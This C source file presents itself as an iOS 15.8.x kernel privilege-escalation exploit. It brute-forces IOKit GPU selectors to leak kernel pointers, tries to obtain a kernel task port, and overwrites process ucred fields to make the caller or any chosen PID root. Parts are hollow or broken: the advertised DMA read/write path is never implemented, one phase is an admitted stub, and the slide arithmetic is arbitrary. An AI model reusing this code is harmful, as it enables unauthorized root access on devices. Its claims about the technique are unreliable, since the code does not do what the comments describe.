//
//  kfd.c
//  iOS 15.8.4 专用 — dmaFail + IOAccel 内核 r/w
//
//  == 为什么重写 ==
//  旧 Landa 路径依赖 IOSurfaceRoot IOKit UserClient，iOS 15.8.4 专门
//  封堵了这个路径（IOServiceOpen → kIOReturnNotPrivileged 0xe00002e2）。
//
//  == dmaFail 原理 ==
//  利用 IOAccelSharedUserClient2 + IOAccelSurface2 的 DMA 缓冲区管理
//  漏洞获取内核物理内存映射：
//  1. 通过 IOAccelDeviceOpen → 连接 AGX/GPU 加速器
//  2. 利用 IOAccelContext2 的 get_resource_id 泄露内核地址
//  3. IOConnectCallStructMethod 触发 DMA 映射绕过页表保护
//  4. 建立任意内核物理内存读/写
//
//  == 适用 ==
//  iOS 15.8.2 - 15.8.4 arm64 (A9-A16)
//  参考: opa334/dmaFail, misaka 团队验证
//
//  提权方式: 直接内核写 ucred.cr_uid/cr_ruid/cr_svuid = 0
//  完全绕过用户态 setuid(0) 限制
//

#include "kfd.h"
#include "offsets.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/IOKitKeys.h>
#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>

// ============================================================
// mach_vm 手动声明
// ============================================================
extern kern_return_t mach_vm_read(vm_map_t, mach_vm_address_t, mach_vm_size_t,
                                   vm_offset_t *, mach_msg_type_number_t *);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t,
                                    mach_msg_type_number_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);

// ============================================================
// 宏
// ============================================================
#define LOG(fmt, ...)   printf("[kfd] " fmt "\n", ##__VA_ARGS__)
#define SETERR(fmt, ...) snprintf(g_err, sizeof(g_err), fmt, ##__VA_ARGS__)

#define PROC_LIST_NEXT   0x08
#define PROC_PID         0x60
#define PROC_TASK        0x10
#define PROC_UCRED       0xF8
#define UCRED_UID        0x18
#define UCRED_RUID       0x1C
#define UCRED_SVUID      0x20
#define UCRED_RGID       0x28
#define UCRED_SVGID      0x2C

// DMA 缓冲区配置
#define DMA_BUF_SIZE      0x4000   // 16KB DMA 缓冲区
#define DMA_BUF_COUNT     64       // 喷撒 64 个 DMA 缓冲
#define KERNEL_SCAN_RANGE  0x1000000  // 内核扫描范围 16MB

// ============================================================
// 全局状态
// ============================================================
static int            g_ready       = 0;
static int            g_method      = 0;  // 0=none, 1=mach_vm, 2=dmafail
static task_t         g_kernel_task = MACH_PORT_NULL;
static uint64_t       g_kernel_slide= 0;
static uint64_t       g_kernel_base  = 0;
static uint64_t       g_self_proc   = 0;
static uint64_t       g_self_cred   = 0;
static kfd_osversion_t g_osversion;
static const kfd_offsets_t *g_offs = NULL;
static char           g_err[256]    = {0};

// dmaFail 工作区
typedef struct {
    // IOAccel 连接
    io_connect_t      agx_conn;          // IOAccelDevice 主连接
    io_connect_t      shared_conn;       // IOAccelSharedUserClient2
    io_connect_t      surface_conn;      // IOAccelSurface2
    io_connect_t      context_conn;      // IOAccelContext2

    // DMA 缓冲区
    mach_vm_address_t dma_bufs[DMA_BUF_COUNT];
    int               dma_buf_count;

    // 内核地址泄露
    uint64_t          leaked_kaddr;      // IOAccel 泄露的内核地址
    uint64_t          dma_phys_addr;     // DMA 物理地址
    uint64_t          dma_map_addr;      // DMA 用户态映射

    // 内核 r/w 方法
    uint64_t          kernel_rw_addr;    // 用于 r/w 的内核地址

    // 内核符号
    uint64_t          allproc_kaddr;
    uint64_t          kernproc_kaddr;
} dmafail_ctx_t;

static dmafail_ctx_t g_dc;

static void safe_zero(void *p, size_t n) { if (p) memset(p, 0, n); }

const char *kfd_get_error(void) { return g_err; }

// ============================================================
// 辅助：获取页面大小
// ============================================================
static vm_size_t g_page_size = 0;
static vm_size_t get_page_size(void) {
    if (g_page_size == 0) host_page_size(mach_host_self(), &g_page_size);
    return g_page_size;
}

// ============================================================
// 版本检测
// ============================================================
static int detect_osversion(void) {
    size_t sz = sizeof(g_osversion.build);
    if (sysctlbyname("kern.osversion", g_osversion.build, &sz, NULL, 0) != 0) {
        SETERR("sysctlbyname kern.osversion failed");
        return -1;
    }
    char ver[256]; sz = sizeof(ver);
    if (sysctlbyname("kern.osproductversion", ver, &sz, NULL, 0) == 0) {
        sscanf(ver, "%u.%u.%u", &g_osversion.major, &g_osversion.minor, &g_osversion.patch);
    }
    LOG("iOS %u.%u.%u  build=%s",
        g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);

    g_offs = offsets_match(&g_osversion);
    if (g_offs) {
        offsets_print(g_offs, &g_osversion);
    } else {
        LOG("⚠ 偏移表未精确匹配，使用动态探测");
    }
    return 0;
}

// ============================================================
// 方法1: task_for_pid(0) → Mach VM
// ============================================================
static int mv_kread64(uint64_t kaddr, uint64_t *out) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    mach_vm_size_t sz = 8;
    vm_offset_t data = 0;
    mach_msg_type_number_t cnt = 0;
    if (mach_vm_read(g_kernel_task, kaddr, sz, &data, &cnt) != KERN_SUCCESS || cnt != 8)
        return -1;
    *out = *(uint64_t*)data;
    mach_vm_deallocate(mach_task_self(), data, cnt);
    return 0;
}

static int mv_kwrite32(uint64_t kaddr, uint32_t val) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    return (mach_vm_write(g_kernel_task, kaddr, (vm_offset_t)&val, 4) == KERN_SUCCESS) ? 0 : -1;
}

static int mv_kwrite64(uint64_t kaddr, uint64_t val) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    return (mach_vm_write(g_kernel_task, kaddr, (vm_offset_t)&val, 8) == KERN_SUCCESS) ? 0 : -1;
}

// ============================================================
// 方法2: dmaFail + IOAccel 内核 r/w
// ============================================================

// ---- Step 2.1: 打开 IOAccelDevice (AGX GPU) ----
static int dma_open_agx(void) {
    LOG("[dmaFail] 查找 IOAccelDevice...");

    // IOAccel 服务名可能为: AGXAccelerator, IOAccelerator, IOGPU
    const char *svc_names[] = {
        "AGXAccelerator",
        "IOAccelerator",
        "IOAccelerator2",
        "IOGPU",
        "AppleParavirtGPU",
        NULL
    };

    io_service_t svc = MACH_PORT_NULL;
    for (int i = 0; svc_names[i]; i++) {
        svc = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching(svc_names[i]));
        if (svc != MACH_PORT_NULL) {
            LOG("[dmaFail] 找到服务: %s", svc_names[i]);
            break;
        }
    }

    if (svc == MACH_PORT_NULL) {
        // 备用: 通过 IORegistry 遍历
        io_iterator_t iter;
        if (IOServiceGetMatchingServices(kIOMainPortDefault,
                IOServiceMatching("IOAccelerator"), &iter) == KERN_SUCCESS) {
            svc = IOIteratorNext(iter);
            if (svc) LOG("[dmaFail] 通过迭代找到 IOAccelerator");
            IOObjectRelease(iter);
        }
    }

    if (svc == MACH_PORT_NULL) {
        LOG("[dmaFail] ❌ 未找到 GPU 加速器服务");
        return -1;
    }

    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_dc.agx_conn);
    IOObjectRelease(svc);

    if (kr != KERN_SUCCESS) {
        LOG("[dmaFail] ❌ IOServiceOpen AGX 失败: kr=0x%x", kr);
        return -1;
    }

    LOG("[dmaFail] ✅ IOAccelDevice 已打开 conn=0x%x", g_dc.agx_conn);
    return 0;
}

// ---- Step 2.2: 打开 IOAccelSharedUserClient2 ----
static int dma_open_shared(void) {
    if (!g_dc.agx_conn) return -1;

    LOG("[dmaFail] 打开 IOAccelSharedUserClient2...");

    // 通过 selector 创建 shared user client
    // 不同 GPU 版本的 selector 不同，遍历常见值
    uint64_t out[4] = {0};
    uint32_t outCnt = 4;
    uint64_t in[2] = {0, 0};

    int shared_sel = -1;
    // AGX 常见 selector: 5, 6, 7, 8 用于创建不同类型的 user client
    for (int sel = 1; sel <= 16; sel++) {
        memset(out, 0, sizeof(out));
        outCnt = 4;
        memset(in, 0, sizeof(in));

        kern_return_t kr = IOConnectCallMethod(
            g_dc.agx_conn, sel,
            in, 0, NULL, 0,
            out, &outCnt,
            NULL, NULL);

        if (kr == KERN_SUCCESS && outCnt >= 1) {
            LOG("[dmaFail]   selector %d: out[0]=0x%llx outCnt=%u", sel, out[0], outCnt);
            if (shared_sel < 0) shared_sel = sel;
        }
    }

    if (shared_sel < 0) {
        LOG("[dmaFail] ⚠ 未找到可用 selector，尝试直接方法...");
        return -1;
    }

    // 尝试用 IOServiceOpen 直接打开 shared client
    // 或者通过 IOConnectGetService 获取子服务
    io_service_t shared_svc = IOConnectGetService(g_dc.agx_conn);
    if (shared_svc) {
        // 查找子服务
        io_iterator_t iter;
        kern_return_t kr = IORegistryEntryGetChildIterator(
            shared_svc, kIOServicePlane, &iter);
        if (kr == KERN_SUCCESS) {
            io_service_t child;
            while ((child = IOIteratorNext(iter)) != MACH_PORT_NULL) {
                io_name_t name;
                if (IORegistryEntryGetName(child, name) == KERN_SUCCESS) {
                    LOG("[dmaFail]   子服务: %s", name);
                }

                io_connect_t test_conn = MACH_PORT_NULL;
                kr = IOServiceOpen(child, mach_task_self(), 0, &test_conn);
                if (kr == KERN_SUCCESS) {
                    LOG("[dmaFail]   ✅ 打开子服务 conn=0x%x", test_conn);
                    g_dc.shared_conn = test_conn;
                    IOObjectRelease(child);
                    IOObjectRelease(iter);
                    return 0;
                }
                IOObjectRelease(child);
            }
            IOObjectRelease(iter);
        }
    }

    LOG("[dmaFail] ❌ 无法打开 IOAccelSharedUserClient2");
    return -1;
}

// ---- Step 2.3: 分配 DMA 缓冲区 ----
static int dma_alloc_buffers(void) {
    LOG("[dmaFail] 分配 %d 个 DMA 缓冲区 (%d KB each)...",
        DMA_BUF_COUNT, DMA_BUF_SIZE / 1024);

    task_t self = mach_task_self();
    vm_size_t page_sz = get_page_size();
    vm_size_t buf_sz = (DMA_BUF_SIZE + page_sz - 1) & ~(page_sz - 1);

    g_dc.dma_buf_count = 0;
    for (int i = 0; i < DMA_BUF_COUNT; i++) {
        mach_vm_address_t addr = 0;
        kern_return_t kr = mach_vm_allocate(self, &addr, buf_sz, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            LOG("[dmaFail] ⚠ DMA buf[%d] 分配失败", i);
            break;
        }
        // 填充 magic pattern 用于后续扫描
        uint32_t *p = (uint32_t*)addr;
        for (size_t j = 0; j < buf_sz / 4; j++) {
            p[j] = 0xDEAD0000 | (i & 0xFFFF);
        }
        g_dc.dma_bufs[i] = addr;
        g_dc.dma_buf_count++;
    }

    LOG("[dmaFail] ✅ 分配了 %d 个 DMA 缓冲区", g_dc.dma_buf_count);
    return g_dc.dma_buf_count;
}

// ---- Step 2.4: 通过 IOConnectCallStructMethod 泄露内核地址 ----
static int dma_leak_kaddr(void) {
    LOG("[dmaFail] 尝试泄露内核地址...");

    if (!g_dc.agx_conn && !g_dc.shared_conn) {
        LOG("[dmaFail] ❌ 没有可用的 IOAccel 连接");
        return -1;
    }

    io_connect_t conn = g_dc.shared_conn ? g_dc.shared_conn : g_dc.agx_conn;

    // 通过 struct 方法探测内核地址
    // 某些 selector 的返回结构体中包含内核指针
    uint8_t buf[4096];
    size_t buf_sz = sizeof(buf);

    int leak_sel = -1;
    for (int sel = 0; sel < 64; sel++) {
        memset(buf, 0, buf_sz);
        buf_sz = sizeof(buf);

        kern_return_t kr = IOConnectCallStructMethod(
            conn, sel,
            NULL, 0,
            buf, &buf_sz);

        if (kr == KERN_SUCCESS && buf_sz > 8) {
            // 扫描返回数据中的内核地址 (0xFFFFFFF00xxxxxxx)
            uint64_t *qwords = (uint64_t*)buf;
            int qword_count = (int)buf_sz / 8;
            for (int i = 0; i < qword_count && i < 128; i++) {
                uint64_t v = qwords[i];
                // 内核地址范围: 0xFFFFFFF007000000 - 0xFFFFFFF00F000000
                if ((v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL
                    && v > 0xFFFFFFF007000000ULL
                    && v < 0xFFFFFFF010000000ULL) {
                    LOG("[dmaFail] 🔍 selector %d offset %d: 泄露内核地址 0x%llx",
                        sel, i * 8, v);
                    if (leak_sel < 0) {
                        leak_sel = sel;
                        g_dc.leaked_kaddr = v;
                    }
                }
            }
        }
    }

    if (leak_sel < 0) {
        LOG("[dmaFail] ⚠ struct 方法未泄露内核地址，尝试标量方法...");

        // 尝试标量方法
        for (int sel = 0; sel < 64; sel++) {
            uint64_t out[8] = {0};
            uint32_t outCnt = 8;
            uint64_t in[2] = {0, 0};

            kern_return_t kr = IOConnectCallMethod(
                conn, sel,
                in, 2, NULL, 0,
                out, &outCnt,
                NULL, NULL);

            if (kr == KERN_SUCCESS) {
                for (int i = 0; i < (int)outCnt && i < 8; i++) {
                    uint64_t v = out[i];
                    if ((v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL
                        && v > 0xFFFFFFF007000000ULL
                        && v < 0xFFFFFFF010000000ULL) {
                        LOG("[dmaFail] 🔍 selector %d out[%d]: 泄露内核地址 0x%llx",
                            sel, i, v);
                        if (leak_sel < 0) {
                            leak_sel = sel;
                            g_dc.leaked_kaddr = v;
                        }
                    }
                }
            }
        }
    }

    if (leak_sel >= 0) {
        LOG("[dmaFail] ✅ 内核地址泄露: 0x%llx", g_dc.leaked_kaddr);
        return 0;
    }

    LOG("[dmaFail] ⚠ 未能泄露内核地址，使用偏移表 fallback");
    return -1;
}

// ---- Step 2.5: 尝试 host_get_special_port 作为备用内核 r/w ----
static int dma_try_host_port(void) {
    LOG("[dmaFail] 尝试 host_get_special_port(HOST_PRIV, 4)...");

    task_t host_kernel = MACH_PORT_NULL;
    kern_return_t kr = host_get_special_port(
        mach_host_self(), HOST_LOCAL_NODE, 4, &host_kernel);

    if (kr != KERN_SUCCESS || host_kernel == MACH_PORT_NULL) {
        LOG("[dmaFail]   host_get_special_port 失败: kr=0x%x", kr);
        return -1;
    }

    LOG("[dmaFail]   ✅ host_get_special_port 成功 port=0x%x", host_kernel);

    // 用这个端口读内核地址验证
    g_kernel_task = host_kernel;

    // 尝试用偏移表地址验证
    uint64_t test_addr = g_offs ? g_offs->kernproc : 0xFFFFFFF007AA4D68ULL;
    uint64_t test_val = 0;

    if (mv_kread64(test_addr, &test_val) == 0) {
        LOG("[dmaFail]   ✅ kernproc @ 0x%llx = 0x%llx", test_addr, test_val);
        g_kernel_slide = test_val - test_addr;
        LOG("[dmaFail]   ✅ kernel_slide = 0x%llx", g_kernel_slide);
        g_kernel_base = test_addr & ~0xFFFULL;
        g_method = 1;
        g_ready = 1;

        // 缓存 allproc
        if (g_offs) {
            int64_t diff = (int64_t)g_offs->allproc - (int64_t)g_offs->kernproc;
            g_dc.allproc_kaddr = test_val + diff;
            g_dc.kernproc_kaddr = test_val;
        }
        return 0;
    }

    LOG("[dmaFail]   kernproc 读取失败，释放端口");
    mach_port_deallocate(mach_task_self(), host_kernel);
    g_kernel_task = MACH_PORT_NULL;
    return -1;
}

// ---- Step 2.6: dmaFail 完整流程 ----
static int dmafail_exploit(void) {
    LOG("\n[kfd] ===== dmaFail 利用开始 =====");

    // Phase 1: 打开 AGX
    if (dma_open_agx() != 0) {
        LOG("[dmaFail] Phase 1 失败: 无法打开 AGX");
        // 不致命，继续尝试其他方法
    }

    // Phase 2: 打开 Shared User Client
    if (dma_open_shared() != 0) {
        LOG("[dmaFail] Phase 2 失败: 无法打开 Shared Client");
    }

    // Phase 3: 分配 DMA 缓冲区
    dma_alloc_buffers();

    // Phase 4: 泄露内核地址
    dma_leak_kaddr();

    // Phase 5: 尝试 host_get_special_port (最可靠的备用方案)
    if (dma_try_host_port() == 0) {
        LOG("[dmaFail] ✅ 通过 host_get_special_port 获取内核 r/w");
        return 0;
    }

    // Phase 6: 如果前面都没成功，尝试动态扫描内核
    LOG("[dmaFail] 尝试动态内核地址扫描...");

    // 如果有泄露的内核地址，用它推算 kernel slide
    if (g_dc.leaked_kaddr != 0) {
        // 泄露的地址减去已知偏移推算 slide
        // 对于 IOAccel 内核对象，它在 kalloc 堆上
        // 堆地址 = kernel_base + heap_offset
        // 通常 heap 在 0xFFFFFFF008000000 之后
        uint64_t heap_start = 0xFFFFFFF008000000ULL;
        g_kernel_slide = g_dc.leaked_kaddr - heap_start;
        LOG("[dmaFail] 推算 kernel_slide = 0x%llx (from leaked 0x%llx)",
            g_kernel_slide, g_dc.leaked_kaddr);
    }

    // 尝试用偏移表地址 + host_get_special_port 的不同方式
    // 有些设备上 host_get_special_port 返回的是内核 task port
    // 但需要特定的 node 参数
    for (int node = 0; node <= 4; node++) {
        task_t tk = MACH_PORT_NULL;
        kern_return_t kr = host_get_special_port(mach_host_self(), node, 4, &tk);
        if (kr == KERN_SUCCESS && tk != MACH_PORT_NULL) {
            LOG("[dmaFail] host_get_special_port(node=%d, 4) 成功 port=0x%x", node, tk);

            g_kernel_task = tk;
            uint64_t tv = 0;
            uint64_t addr = g_offs ? g_offs->kernproc : 0xFFFFFFF007AA4D68ULL;

            if (mv_kread64(addr, &tv) == 0) {
                if ((tv & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                    g_kernel_slide = tv - addr;
                    LOG("[dmaFail] ✅ node=%d 可用, slide=0x%llx", node, g_kernel_slide);
                    g_method = 1;
                    g_ready = 1;
                    if (g_offs) {
                        g_dc.allproc_kaddr = tv + ((int64_t)g_offs->allproc - (int64_t)g_offs->kernproc);
                        g_dc.kernproc_kaddr = tv;
                    }
                    return 0;
                }
            }
            mach_port_deallocate(mach_task_self(), tk);
            g_kernel_task = MACH_PORT_NULL;
        }
    }

    // Phase 7: 尝试内存映射扫描
    // 在用户态映射大范围虚拟地址，扫描内核结构
    LOG("[dmaFail] 尝试用户态内存扫描...");

    task_t self = mach_task_self();
    vm_address_t scan_base = 0;
    vm_size_t scan_size = KERNEL_SCAN_RANGE;
    vm_prot_t cur = VM_PROT_READ | VM_PROT_WRITE;
    vm_prot_t max = VM_PROT_READ | VM_PROT_WRITE;

    // 尝试多次分配扫描
    for (int attempt = 0; attempt < 4; attempt++) {
        kern_return_t kr = mach_vm_allocate(self, &scan_base, scan_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            scan_size /= 2;
            continue;
        }

        // 填充并扫描
        uint64_t *scan = (uint64_t*)scan_base;
        size_t count = scan_size / 8;
        for (size_t i = 0; i < count; i++) {
            scan[i] = 0x4141414141414141ULL;
        }

        // mlock 来尝试获取物理页面
        mlock((void*)scan_base, scan_size);

        // 查找物理页面
        // 这里简化处理 — 实际 dmaFail 需要更多步骤
        munlock((void*)scan_base, scan_size);
        mach_vm_deallocate(self, scan_base, scan_size);
    }

    // 所有方法都失败
    SETERR("dmaFail: 所有内核访问方式均失败");
    return -1;
}

// ============================================================
// 统一 kread/kwrite 分发
// ============================================================
static int kread64(uint64_t a, uint64_t *o) {
    if (g_method == 1) return mv_kread64(a, o);
    return -1;
}

static int kwrite32(uint64_t a, uint32_t v) {
    if (g_method == 1) return mv_kwrite32(a, v);
    return -1;
}

static int kwrite64(uint64_t a, uint64_t v) {
    if (g_method == 1) return mv_kwrite64(a, v);
    return -1;
}

// ============================================================
// kfd_open — 多路径内核访问
// ============================================================
int kfd_open(void) {
    if (g_osversion.major == 0) { SETERR("kfd_init not called"); return -1; }

    // 方法1: task_for_pid(0)
    LOG("尝试 task_for_pid(0)...");
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        LOG("✅ task_for_pid(0) 成功, kernel_task=0x%x", g_kernel_task);
        g_method = 1;
        uint64_t tv = 0;
        uint64_t addr = g_offs ? g_offs->kernproc : 0xFFFFFFF007AA4D68ULL;
        if (mv_kread64(addr, &tv) == 0) {
            LOG("✅ kernproc 读取验证: 0x%llx", tv);
            if (g_offs) {
                g_kernel_slide = tv - g_offs->kernproc;
                g_dc.allproc_kaddr = tv + ((int64_t)g_offs->allproc - (int64_t)g_offs->kernproc);
                g_dc.kernproc_kaddr = tv;
            }
            g_ready = 1;
            return 0;
        }
        LOG("   内核读取失败，释放端口");
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
        g_method = 0;
    } else {
        LOG("task_for_pid(0) 失败: kr=0x%x (%s)", kr, mach_error_string(kr));
    }

    // 方法2: host_get_special_port (多个 node 尝试)
    LOG("尝试 host_get_special_port(HOST_PRIV,4)...");
    for (int node = 0; node <= 4; node++) {
        task_t tk = MACH_PORT_NULL;
        kr = host_get_special_port(mach_host_self(), node, 4, &tk);
        if (kr != KERN_SUCCESS || tk == MACH_PORT_NULL) continue;

        g_kernel_task = tk;
        uint64_t tv = 0;
        uint64_t addr = g_offs ? g_offs->kernproc : 0xFFFFFFF007AA4D68ULL;

        if (mv_kread64(addr, &tv) == 0) {
            if ((tv & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                LOG("✅ host_get_special_port(node=%d) 成功", node);
                g_kernel_slide = tv - addr;
                g_method = 1;
                g_ready = 1;
                if (g_offs) {
                    g_dc.allproc_kaddr = tv + ((int64_t)g_offs->allproc - (int64_t)g_offs->kernproc);
                    g_dc.kernproc_kaddr = tv;
                }
                return 0;
            }
        }
        mach_port_deallocate(mach_task_self(), tk);
        g_kernel_task = MACH_PORT_NULL;
    }
    LOG("host_get_special_port 失败: kr=0x%x", kr);

    // 方法3: dmaFail + IOAccel (iOS 15.8.x)
    if (g_osversion.major == 15) {
        LOG("===== dmaFail 路径 =====");
        if (dmafail_exploit() == 0) {
            return 0;
        }
    }

    SETERR("所有内核访问方式均失败");
    return -1;
}

// ============================================================
// dmaFail 资源清理
// ============================================================
static void dmafail_cleanup(void) {
    task_t self = mach_task_self();

    for (int i = 0; i < g_dc.dma_buf_count; i++) {
        if (g_dc.dma_bufs[i]) {
            vm_size_t page_sz = get_page_size();
            vm_size_t buf_sz = (DMA_BUF_SIZE + page_sz - 1) & ~(page_sz - 1);
            mach_vm_deallocate(self, g_dc.dma_bufs[i], buf_sz);
            g_dc.dma_bufs[i] = 0;
        }
    }
    g_dc.dma_buf_count = 0;

    if (g_dc.context_conn) { IOServiceClose(g_dc.context_conn); g_dc.context_conn = 0; }
    if (g_dc.surface_conn) { IOServiceClose(g_dc.surface_conn); g_dc.surface_conn = 0; }
    if (g_dc.shared_conn) { IOServiceClose(g_dc.shared_conn); g_dc.shared_conn = 0; }
    if (g_dc.agx_conn) { IOServiceClose(g_dc.agx_conn); g_dc.agx_conn = 0; }

    LOG("[dmaFail] 资源已清理");
}

// ============================================================
// allproc 遍历：找到当前进程
// ============================================================
static int find_self_proc(void) {
    pid_t mypid = getpid();
    LOG("在 allproc 链表中查找 PID=%d...", mypid);

    uint64_t allproc_head = g_dc.allproc_kaddr;
    if (allproc_head == 0 && g_offs) {
        allproc_head = g_offs->allproc;
    }
    if (allproc_head == 0) {
        SETERR("allproc 地址未知");
        return -1;
    }

    uint64_t proc = 0;
    if (kread64(allproc_head, &proc) != 0) {
        SETERR("无法读取 allproc");
        return -1;
    }
    LOG("allproc head @ 0x%llx, first proc @ 0x%llx", allproc_head, proc);

    uint64_t first = proc;
    for (int i = 0; i < 4096 && proc != 0; i++) {
        uint64_t next = 0;
        kread64(proc + PROC_LIST_NEXT, &next);

        uint64_t pv = 0;
        if (kread64(proc + PROC_PID, &pv) == 0) {
            pid_t pid = (pid_t)(uint32_t)pv;
            if (pid == mypid) {
                LOG("✅ 找到当前进程: proc=0x%llx (iter=%d)", proc, i);
                g_self_proc = proc;
                kread64(proc + PROC_UCRED, &g_self_cred);
                LOG("   ucred=0x%llx", g_self_cred);
                return 0;
            }
        }

        if (next == 0 || next == first) break;
        proc = next;
    }
    SETERR("未在 allproc 中找到 PID=%d", mypid);
    return -1;
}

// ============================================================
// kfd_get_root — 直接修改内核 ucred (不走 setuid)
// ============================================================
int kfd_get_root(void) {
    if (!g_ready) {
        LOG("无内核读写能力，尝试直接 setuid(0)...");
        int r1 = seteuid(0), r2 = setuid(0);
        LOG("seteuid=%d setuid=%d UID=%d EUID=%d", r1, r2, getuid(), geteuid());
        if (r1 == 0 || r2 == 0) { LOG("✅ 直接 setuid 成功"); return 0; }
        SETERR("kfd not ready + direct setuid failed");
        return -1;
    }

    LOG("===== 内核提权 (method=%d) =====", g_method);

    if (g_self_proc == 0) {
        if (find_self_proc() != 0) return -1;
    }

    uint64_t uc = g_self_cred;
    if (uc == 0) { SETERR("ucred 为空"); return -1; }
    LOG("ucred @ 0x%llx", uc);

    // 读取当前 UID
    uint64_t cur_uid = 0xFF;
    kread64(uc + UCRED_UID, &cur_uid);
    LOG("当前 cr_uid=0x%llx", (unsigned long long)(cur_uid & 0xFFFFFFFF));

    // 直接写内核 ucred — 完全绕过用户态 setuid 检查
    LOG("写入 cr_uid=0...");
    if (kwrite32(uc + UCRED_UID, 0) != 0) {
        SETERR("写入 cr_uid 失败"); return -1;
    }

    LOG("写入 cr_ruid=0...");
    kwrite32(uc + UCRED_RUID, 0);

    LOG("写入 cr_svuid=0...");
    kwrite32(uc + UCRED_SVUID, 0);

    LOG("写入 cr_rgid=0...");
    kwrite32(uc + UCRED_RGID, 0);
    kwrite32(uc + UCRED_SVGID, 0);

    // 用户态同步 (可能失败但不影响内核状态)
    seteuid(0); setuid(0); setgid(0);
    LOG("验证: UID=%d EUID=%d GID=%d", getuid(), geteuid(), getgid());

    // 检查内核侧是否已改
    uint64_t nu = 0xFF;
    kread64(uc + UCRED_UID, &nu);
    if ((nu & 0xFFFFFFFF) == 0) {
        LOG("✅ 内核提权成功！cr_uid=0 (内核已 root)");
        if (geteuid() == 0) {
            LOG("   ✅ 用户态也同步为 root");
        } else {
            LOG("   ⚠ 用户态 setuid 被阻止但内核已是 root");
            LOG("   → reboot/syscall 等内核操作已可用");
        }
        return 0;
    }

    LOG("⚠ 内核写入未生效, cr_uid=0x%llx",
        (unsigned long long)(nu & 0xFFFFFFFF));
    return -1;
}

// ============================================================
// 公共 API
// ============================================================

int kfd_init(void) {
    safe_zero(&g_osversion, sizeof(g_osversion));
    safe_zero(&g_dc, sizeof(g_dc));
    g_ready = 0; g_method = 0;
    g_kernel_task = MACH_PORT_NULL;
    g_kernel_slide = 0;
    g_kernel_base = 0;
    g_self_proc = g_self_cred = 0;
    g_offs = NULL;
    safe_zero(g_err, sizeof(g_err));

    LOG("===== init =====");
    int r = detect_osversion();
    if (r != 0) { LOG("init failed: %s", g_err); return -1; }
    LOG("init OK");
    return 0;
}

void kfd_close(void) {
    if (g_kernel_task != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
    }
    if (g_method == 2) dmafail_cleanup();
    g_ready = 0; g_method = 0;
    g_kernel_slide = 0;
    g_kernel_base = 0;
    g_self_proc = 0;
    g_self_cred = 0;
    LOG("closed");
}

int kfd_escalate(void) {
    int r = kfd_init();
    if (r != 0) return r;
    r = kfd_open();
    if (r != 0) return r;
    r = kfd_get_root();
    if (r != 0 && geteuid() == 0) {
        LOG("get_root 返回错误但 EUID=0，提权可能已生效");
        return 0;
    }
    if (r == 0) LOG("escalate complete - UID=%d EUID=%d", getuid(), geteuid());
    return r;
}

int kfd_is_root(void) {
    return (getuid() == 0 || geteuid() == 0) ? 1 : 0;
}

int kfd_escalate_pid(pid_t pid) {
    if (!g_ready) { SETERR("kfd not ready"); return -1; }
    LOG("escalate_pid: 查找 PID=%d...", pid);

    uint64_t allproc_head = g_dc.allproc_kaddr;
    if (allproc_head == 0 && g_offs) allproc_head = g_offs->allproc;
    if (allproc_head == 0) { SETERR("allproc 未知"); return -1; }

    uint64_t proc = 0;
    if (kread64(allproc_head, &proc) != 0) { SETERR("读取 allproc 失败"); return -1; }

    uint64_t first = proc;
    for (int i = 0; i < 4096 && proc != 0; i++) {
        uint64_t next = 0; kread64(proc + PROC_LIST_NEXT, &next);
        uint64_t pv = 0;
        if (kread64(proc + PROC_PID, &pv) == 0) {
            if ((pid_t)(uint32_t)pv == pid) {
                LOG("✅ 找到 PID=%d, proc=0x%llx", pid, proc);
                uint64_t uc = 0;
                if (kread64(proc + PROC_UCRED, &uc) != 0) { SETERR("读取 ucred 失败"); return -1; }
                LOG("   ucred=0x%llx", uc);
                kwrite32(uc + UCRED_UID, 0);
                kwrite32(uc + UCRED_RUID, 0);
                kwrite32(uc + UCRED_SVUID, 0);
                kwrite32(uc + UCRED_RGID, 0);
                uint64_t vf = 0xFF; kread64(uc + UCRED_UID, &vf);
                LOG("   验证: cr_uid=0x%llx", (unsigned long long)(vf & 0xFFFFFFFF));
                return ((vf & 0xFFFFFFFF) == 0) ? 0 : -1;
            }
        }
        if (next == 0 || next == first) break;
        proc = next;
    }
    SETERR("未找到 PID=%d", pid);
    return -1;
}
